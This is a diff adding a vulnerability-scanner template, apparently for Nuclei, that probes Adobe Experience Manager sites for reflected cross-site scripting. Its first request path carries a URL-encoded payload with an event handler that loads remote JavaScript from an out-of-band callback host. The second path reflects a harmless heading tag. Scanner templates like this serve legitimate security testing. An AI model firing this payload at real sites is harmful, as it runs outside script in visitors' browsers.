@@ -1,0 +1,30 @@
+id: aem-reflected-xss
+
+info:
+  name: AEM REFLECTED XSS
+  author: reewardius
+  reference: https://medium.com/@jonathanbouman/reflected-xss-at-philips-com-e48bf8f9cd3c
+  severity: medium
+  tags: xss,aem,generic
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%3Cbody%20onpointerenter%3D%22jQuery.getScript%28%27https:/'+'/{{interactsh-url}}/philips/inject.js%27%29%22%3E%3Fdebug%3Dlayout"
+      - '{{BaseURL}}/%3Ch1%3EReewardius%3C%2Fh1%3E%3Fdebug%3Dlayout'
+      
+    stop-at-first-match: true
+    redirects: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "http"
+          - "dns"
+        condition: or
+        
+      - type: word
+        part: body
+        words:
+          - "<h1>Reewardius</h1>.html"
